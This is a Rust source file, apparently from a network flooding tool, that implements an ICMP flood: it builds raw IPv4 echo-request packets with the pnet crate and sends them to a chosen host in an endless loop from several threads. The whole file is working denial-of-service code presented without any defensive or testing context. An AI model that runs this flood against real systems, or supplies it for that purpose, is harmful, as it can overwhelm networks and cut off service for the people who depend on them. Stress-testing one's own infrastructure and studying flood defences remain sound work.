use std::net::Ipv4Addr;
use std::sync::{Arc, Mutex};
use std::thread::JoinHandle;
use std::time::Duration;

use anyhow::Result;
use pnet::packet::icmp::echo_request::MutableEchoRequestPacket;
use pnet::packet::icmp::IcmpTypes;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::MutablePacket;
use pnet::transport::TransportChannelType::Layer3;
use pnet::transport::{transport_channel, TransportSender};
use pnet::util;

use crate::cli::IcmpArgs;
use crate::flood::Flood;
use crate::ip::{self, IPV4_HEADER_LEN};

const ICMP_HEADER_LEN: usize = 8;

pub struct IcmpFlood {
  tx: Arc<Mutex<TransportSender>>,
  delay: u64,
  args: IcmpArgs,
}

impl IcmpFlood {
  pub fn init(args: IcmpArgs, delay: u64) -> Result<Self> {
    println!("ICMP flood");
    println!("Payloading {}-byte packets", args.size);

    let (tx, _) = transport_channel(2 << 15, Layer3(IpNextHeaderProtocols::Icmp)).unwrap();
    Ok(Self {
      tx: Arc::new(Mutex::new(tx)),
      delay,
      args,
    })
  }

  fn flood(tx: Arc<Mutex<TransportSender>>, addr: Ipv4Addr, size: usize, delay: u64) {
    let mut buffer_icmp = vec![0u8; size + ICMP_HEADER_LEN];
    let mut buffer_ip = vec![0u8; buffer_icmp.len() + IPV4_HEADER_LEN];
    loop {
      let packet = create_icmp_packet(&mut buffer_ip, &mut buffer_icmp, addr);
      let mut tx = tx.lock().unwrap();
      if let Err(err) = tx.send_to(packet, std::net::IpAddr::V4(addr)) {
        panic!("{err}");
      }
      std::thread::sleep(Duration::from_micros(delay))
    }
  }
}

impl Flood for IcmpFlood {
  fn start(&self, threads: usize) -> Vec<JoinHandle<()>> {
    if threads > 1 {
      println!("Spawning {} threads", threads);
    }
    (0..threads)
      .map(|_| {
        let tx = self.tx.clone();
        let addr = self.args.host;
        let size = self.args.size;
        let delay = self.delay;
        std::thread::spawn(move || IcmpFlood::flood(tx, addr, size, delay))
      })
      .collect()
  }
}

fn create_icmp_packet<'a>(buffer_ip: &'a mut [u8], buffer_icmp: &'a mut [u8], dest: Ipv4Addr) -> MutableIpv4Packet<'a> {
  let mut ipv4_packet = ip::create_ipv4_packet(buffer_ip, dest, IpNextHeaderProtocols::Icmp, buffer_icmp.len());

  let mut icmp_packet = MutableEchoRequestPacket::new(buffer_icmp).expect("Error creating icmp packet");
  icmp_packet.set_icmp_type(IcmpTypes::EchoRequest);
  let checksum = util::checksum(icmp_packet.packet_mut(), 1);
  icmp_packet.set_checksum(checksum);

  ipv4_packet.set_payload(icmp_packet.packet_mut());
  ipv4_packet
}
